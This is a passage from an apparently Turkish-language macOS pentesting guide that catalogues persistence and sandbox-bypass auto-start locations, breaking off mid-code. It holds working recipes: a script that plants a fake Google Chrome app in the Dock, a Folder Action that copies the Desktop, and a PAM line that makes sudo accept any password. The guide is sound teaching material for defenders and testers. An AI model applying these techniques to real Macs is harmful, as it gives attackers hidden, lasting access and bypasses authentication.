(Login Items hakkındaki önceki bölüme bakın; bu, onun bir uzantısıdır.)

Bir **ZIP** dosyasını **Login Item** olarak saklarsanız, **`Archive Utility`** bu dosyayı açar. ZIP dosyası örneğin **`~/Library`** içinde saklanmışsa ve bir backdoor içeren **`LaunchAgents/file.plist`** klasörünü barındırıyorsa, bu klasör oluşturulur (varsayılan olarak mevcut değildir) ve plist dosyası eklenir. Böylece kullanıcı bir sonraki oturum açışında, plist içinde belirtilen **backdoor çalıştırılır**.

Başka bir seçenek de kullanıcı HOME dizini içinde **`.bash_profile`** ve **`.zshenv`** dosyalarını oluşturmaktır. Böylece LaunchAgents klasörü zaten mevcutsa bu teknik yine çalışır.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- sandbox bypass için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak **`at`** komutunu **çalıştırmanız** gerekir ve komut **etkinleştirilmiş** olmalıdır.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at`** komutunu **çalıştırmanız** gerekir ve komut **etkinleştirilmiş** olmalıdır.

#### **Description**

`at` görevleri, belirli zamanlarda yürütülecek **tek seferlik görevleri zamanlamak** için tasarlanmıştır. cron job'larının aksine, `at` görevleri yürütüldükten sonra otomatik olarak kaldırılır. Bu görevlerin sistem yeniden başlatmalarından sonra da kalıcı olması, belirli koşullar altında potansiyel security concern oluşturmaları açısından önemlidir.<sup>[16]</sup>

Varsayılan olarak **devre dışıdır**, ancak **root** kullanıcısı bunları şu komutla **etkinleştirebilir**:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Bu, 1 saat içinde bir dosya oluşturacaktır:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
`atq:` kullanarak iş kuyruğunu kontrol edin:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Yukarıda planlanmış iki iş görebiliriz. `at -c JOBNUMBER` kullanarak işin ayrıntılarını yazdırabiliriz.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> AT tasks etkin değilse oluşturulan tasks yürütülmez.

**job dosyaları** `/private/var/at/jobs/` konumunda bulunabilir.
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Dosya adı queue'yu, job numarasını ve çalışmasının planlandığı zamanı içerir. Örnek olarak `a0001a019bdcd2` değerine bakalım.

- `a` - queue
- `0001a` - hex cinsinden job numarası, `0x1a = 26`
- `019bdcd2` - hex cinsinden zaman. Epoch'tan bu yana geçen dakikaları temsil eder. `0x019bdcd2`, decimal olarak `26991826` değeridir. Bunu 60 ile çarparsak `1619509560` elde ederiz; bu da `GMT: 2021. April 27., Tuesday 7:46:00` tarihine karşılık gelir.

Job dosyasını yazdırırsak, `at -c` kullanarak elde ettiğimiz bilgilerin aynısını içerdiğini görürüz.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- sandbox bypass için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak Folder Actions'ı yapılandırabilmek için **`System Events`** ile iletişim kurmak üzere `osascript`'i argümanlarla çağırabilmeniz gerekir
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Desktop, Documents ve Downloads gibi bazı temel TCC izinlerine sahiptir

#### Konum

- **`/Library/Scripts/Folder Action Scripts`**
- Root gereklidir
- **Trigger**: Belirtilen klasöre erişim
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Belirtilen klasöre erişim

#### Açıklama ve Exploitation

Folder Actions; öğelerin eklenmesi, kaldırılması veya klasör penceresinin açılması ya da yeniden boyutlandırılması gibi diğer işlemler dahil olmak üzere, bir klasördeki değişikliklerle otomatik olarak tetiklenen script'lerdir. Bu actions çeşitli görevler için kullanılabilir ve Finder UI veya terminal komutları gibi farklı yöntemlerle tetiklenebilir.<sup>[17][18]</sup>

Folder Actions'ı ayarlamak için şu seçeneklere sahipsiniz:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) ile bir Folder Action workflow'u oluşturup bunu service olarak yüklemek.
2. Bir klasörün context menu'sündeki Folder Actions Setup aracılığıyla manuel olarak bir script eklemek.
3. Programatik olarak bir Folder Action ayarlamak için `System Events.app`'e Apple Event mesajları göndermek üzere OSAScript kullanmak.
- Bu yöntem, action'ı sisteme gömmek için özellikle kullanışlıdır ve bir kalıcılık düzeyi sağlar.

Aşağıdaki script, bir Folder Action tarafından çalıştırılabilecek bir örnektir:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Yukarıdaki script'i Folder Actions tarafından kullanılabilir hale getirmek için şu komutla derleyin:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Script derlendikten sonra aşağıdaki scripti çalıştırarak Folder Actions'ı ayarlayın. Bu script, Folder Actions'ı global olarak etkinleştirecek ve daha önce derlenen scripti özellikle Desktop klasörüne bağlayacaktır.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Kurulum script'ini şu şekilde çalıştırın:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Bu persistence yöntemini GUI aracılığıyla uygulamanın yolu şöyledir:

Bu çalıştırılacak script'tir:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Şununla derleyin: `osacompile -l JavaScript -o folder.scpt source.js`

Şuraya taşıyın:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Ardından, `Folder Actions Setup` uygulamasını açın, **izlemek istediğiniz klasörü** seçin ve kendi durumunuzda **`folder.scpt`** dosyasını seçin (benim durumumda dosyaya output2.scp adını verdim):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Şimdi bu klasörü **Finder** ile açarsanız script'iniz çalıştırılır.

Bu yapılandırma, base64 formatında **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** konumundaki **plist** dosyasında saklanıyordu.

Şimdi bu persistence yöntemini GUI erişimi olmadan hazırlamayı deneyelim:

1. Yedeklemek için **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** dosyasını `/tmp` konumuna **kopyalayın**:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. Az önce ayarladığınız Folder Actions'ı **kaldırın**:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Şimdi elimizde boş bir ortam olduğuna göre:

3. Yedek dosyasını kopyalayın: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Bu yapılandırmayı kullanması için Folder Actions Setup.app'i açın: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Bu bende işe yaramadı, ancak writeup'taki talimatlar şunlar:

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- sandbox bypass etmek için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak sistemin içine malicious bir application yüklemiş olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `~/Library/Preferences/com.apple.dock.plist`
- **Tetikleyici**: Kullanıcı Dock içindeki uygulamaya tıkladığında

#### Açıklama ve Exploitation

Dock'ta görünen tüm uygulamalar plist içinde belirtilir: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[19]</sup>

Bir application'ı yalnızca şu şekilde **eklemek** mümkündür:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Bir miktar **social engineering** kullanarak dock içinde örneğin **Google Chrome**'u **taklit edebilir** ve kendi script'inizi çalıştırabilirsiniz:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Renk Seçiciler

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Çok belirli bir eylemin gerçekleşmesi gerekir
- Başka bir sandbox içinde sonlanırsınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/Library/ColorPickers`
- Root gerekli
- Tetikleyici: Renk seçiciyi kullanma
- `~/Library/ColorPickers`
- Tetikleyici: Renk seçiciyi kullanma

#### Açıklama ve Exploit

Kodunuzla bir **color picker** bundle'ı **Compile** edin (örneğin [**bunu kullanabilirsiniz**](https://github.com/viktorstrate/color-picker-plus)), bir constructor ekleyin ([Screen Saver bölümünde](macos-auto-start-locations.md#screen-saver) olduğu gibi) ve bundle'ı `~/Library/ColorPickers` konumuna kopyalayın.<sup>[20]</sup>

Ardından, color picker tetiklendiğinde kodunuz da çalışmalıdır.

Kitaplığınızı yükleyen binary'nin **çok kısıtlayıcı bir sandbox** içinde olduğunu unutmayın: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Useful to bypass sandbox: **Hayır, çünkü kendi uygulamanızı çalıştırmanız gerekir**
- TCC bypass: ???

#### Konum

- Belirli bir uygulama

#### Açıklama ve Exploit

Finder Sync Extension içeren bir uygulama örneği [**burada bulunabilir**](https://github.com/D00MFist/InSync).

Uygulamalar `Finder Sync Extensions` içerebilir. Bu extension, çalıştırılacak bir uygulamanın içine yerleştirilir. Ayrıca extension'ın kodunu çalıştırabilmesi için **geçerli bir Apple developer certificate ile imzalanmış**, **sandboxed** (ancak daha esnek istisnalar eklenebilir) olması ve şuna benzer bir şeyle kaydedilmesi gerekir:<sup>[21][22]</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Ekran Koruyucu

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak sonunda common application sandbox içinde olacaksınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/System/Library/Screen Savers`
- Root gerekli
- **Tetikleyici**: Ekran koruyucuyu seçin
- `/Library/Screen Savers`
- Root gerekli
- **Tetikleyici**: Ekran koruyucuyu seçin
- `~/Library/Screen Savers`
- **Tetikleyici**: Ekran koruyucuyu seçin

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Açıklama ve Exploit

Xcode'da yeni bir proje oluşturun ve yeni bir **Screen Saver** oluşturmak üzere template'i seçin. Ardından kodunuzu ekleyin; örneğin aşağıdaki kod loglar oluşturur.<sup>[23][24]</sup>

**Build** işlemini gerçekleştirin ve `.saver` bundle'ını **`~/Library/Screen Savers`** konumuna kopyalayın. Ardından Screen Saver GUI'sini açın ve üzerine tıklamanız yeterlidir; çok sayıda log oluşturulmalıdır:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Bu kodu yükleyen binary'nin (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) entitlements'ları içinde **`com.apple.security.app-sandbox`** bulunması nedeniyle **common application sandbox** içinde olacağınızı unutmayın.

Saver kodu:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Eklentileri

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Sandbox'u bypass etmek için kullanışlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak bir application sandbox içinde kalırsınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Sandbox oldukça kısıtlı görünür

#### Konum

- `~/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen uzantıya sahip yeni bir dosya oluşturulur.
- `/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen uzantıya sahip yeni bir dosya oluşturulur.
- Root gereklidir
- `/System/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen uzantıya sahip yeni bir dosya oluşturulur.
- Root gereklidir
- `Some.app/Contents/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen uzantıya sahip yeni bir dosya oluşturulur.
- Yeni bir app gereklidir

#### Açıklama ve Exploitation

Spotlight, kullanıcılara **bilgisayarlarındaki verilere hızlı ve kapsamlı erişim** sağlamak üzere tasarlanmış, macOS'un yerleşik arama özelliğidir.\
Bu hızlı arama yeteneğini mümkün kılmak için Spotlight, **özel bir database** tutar ve **çoğu dosyayı parse ederek** bir index oluşturur; böylece hem dosya adları hem de içerikleri arasında hızlı aramalar yapılabilir.<sup>[25]</sup>

Spotlight'ın temel mekanizmasında, adını **'metadata server'** ifadesinden alan 'mds' isimli merkezi bir process bulunur. Bu process, tüm Spotlight service'ini yönetir. Buna ek olarak, farklı dosya türlerini index'lemek gibi çeşitli bakım görevlerini gerçekleştiren birden fazla 'mdworker' daemon'ı bulunur (`ps -ef | grep mdworker`). Bu görevler, Spotlight importer plugin'leri veya **".mdimporter bundle"**'ları aracılığıyla mümkün olur; bunlar Spotlight'ın çok çeşitli dosya formatlarındaki içerikleri anlamasını ve index'lemesini sağlar.

Plugin'ler veya **`.mdimporter`** bundle'ları daha önce belirtilen konumlarda bulunur ve yeni bir bundle ortaya çıkarsa bir dakika içinde yüklenir (herhangi bir service'i yeniden başlatmaya gerek yoktur). Bu bundle'ların, **hangi dosya türlerini ve uzantılarını yönetebileceklerini** belirtmeleri gerekir; böylece Spotlight, belirtilen uzantıya sahip yeni bir dosya oluşturulduğunda bunları kullanır.

Yüklenmiş tüm `mdimporters`'ı şu komutu çalıştırarak **bulmak** mümkündür:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Ve örneğin **/Library/Spotlight/iBooksAuthor.mdimporter**, şu tür dosyaları (diğerlerinin yanı sıra `.iba` ve `.book` uzantılı dosyaları) ayrıştırmak için kullanılır:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Diğer `mdimporter` öğelerinin Plist'ini kontrol ederseniz **`UTTypeConformsTo`** girdisini bulamayabilirsiniz. Bunun nedeni, bunun yerleşik bir _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) olması ve uzantıları belirtmesine gerek olmamasıdır.
>
> Ayrıca, System varsayılan plugin'leri her zaman önceliklidir; bu nedenle bir attacker yalnızca Apple'ın kendi `mdimporter`'ları tarafından başka şekilde index'lenmeyen dosyalara erişebilir.

Kendi importer'ınızı oluşturmak için şu project ile başlayabilirsiniz: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer); ardından adı ve **`CFBundleDocumentTypes`** değerini değiştirin, desteklemek istediğiniz extension'ı desteklemesi için **`UTImportedTypeDeclarations`** ekleyin ve bunları **`schema.xml`** içinde belirtin.\
Ardından, işlenen extension'a sahip bir dosya oluşturulduğunda payload'unuzu execute etmesi için **`GetMetadataForFile`** function'ının kodunu **değiştirin**.

Son olarak yeni **`.mdimporter`** dosyanızı build edip önceki üç location'dan birine copy'layın; ardından **log'ları monitoring** ederek veya **`mdimport -L.`** kontrolüyle ne zaman yüklendiğini kontrol edebilirsiniz.

### ~~Preference Pane~~

> [!CAUTION]
> Bunun artık çalışıyor gibi görünmediğini unutmayın.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Belirli bir user action gerektirir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Bunun artık çalışıyor gibi görünmediğini unutmayın.<sup>[26]</sup>

## Root Sandbox Bypass

> [!TIP]
> Burada, **sandbox bypass** için yararlı olan; yalnızca **root** olarak bir dosyaya **yazarak** bir şeyi execute etmenize olanak tanıyan ve/veya başka **garip koşullar** gerektiren start location'ları bulabilirsiniz.

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root gerekir
- **Trigger**: Zamanı geldiğinde
- `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local`
- Root gerekir
- **Trigger**: Zamanı geldiğinde

#### Description & Exploitation

Periodic script'leri (**`/etc/periodic`**), **`/System/Library/LaunchDaemons/com.apple.periodic*`** içinde configure edilmiş **launch daemon**'lar nedeniyle execute edilir. `/etc/periodic/` içinde saklanan script'lerin **dosyanın owner'ı olarak execute edildiğini** unutmayın; bu nedenle olası bir privilege escalation için çalışmaz.<sup>[27]</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Çalıştırılacak diğer periyodik script'ler **`/etc/defaults/periodic.conf`** içinde belirtilmiştir:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Herhangi bir şekilde `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local` dosyalarından birini yazabiliyorsanız, bu dosya **er ya da geç çalıştırılır**.

> [!WARNING]
> Periodic script'in, **script'in sahibi olarak çalıştırılacağını** unutmayın. Bu nedenle script'in sahibi normal bir kullanıcıysa, script bu kullanıcı olarak çalıştırılır (bu durum privilege escalation saldırılarını engelleyebilir).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Sandbox'ı bypass etmek için kullanışlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- Her zaman root gerekir

#### Açıklama ve Exploitation

PAM, macOS içinde kolay execution'dan ziyade **persistence** ve malware üzerine odaklandığından, bu blog ayrıntılı bir açıklama sunmayacaktır; **bu tekniği daha iyi anlamak için writeup'ları okuyun**.<sup>[28]</sup>

PAM modüllerini şu komutla kontrol edin:
```bash
ls -l /etc/pam.d
```
PAM'i abuse eden bir persistence/privilege escalation tekniği, /etc/pam.d/sudo modülünü değiştirip başına şu satırı eklemek kadar kolaydır:
```bash
auth       sufficient     pam_permit.so
```
Yani **şuna benzer** bir şey görünecek:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Ve bu nedenle **`sudo` kullanma girişimleri başarılı olacaktır**.

> [!CAUTION]
> Bu dizinin TCC tarafından korunduğunu, bu nedenle kullanıcının erişim isteyen bir istem almasının son derece muhtemel olduğunu unutmayın.

Bir başka güzel örnek de `su`'dur; burada PAM modules'a parametreler vermenin de mümkün olduğunu görebilirsiniz (ayrıca bu dosyaya backdoor da yerleştirebilirsiniz):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve ekstra config'ler yapmanız gerekir
- TCC bypass: ???

#### Konum

- `/Library/Security/SecurityAgentPlugins/`
- Root gereklidir
- Plugin'i kullanacak şekilde authorization database'i yapılandırmak da gerekir

#### Açıklama ve Exploitation

Bir kullanıcı login yaptığında persistence sağlamak için çalıştırılacak bir authorization plugin'i oluşturabilirsiniz. Bu plugin'lerden birinin nasıl oluşturulacağı hakkında daha fazla bilgi için önceki writeup'lara bakın (ve dikkatli olun; kötü yazılmış bir plugin sizi sistemin dışında bırakabilir ve Mac'inizi recovery mode'dan temizlemeniz gerekebilir).<sup>[29][30]</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
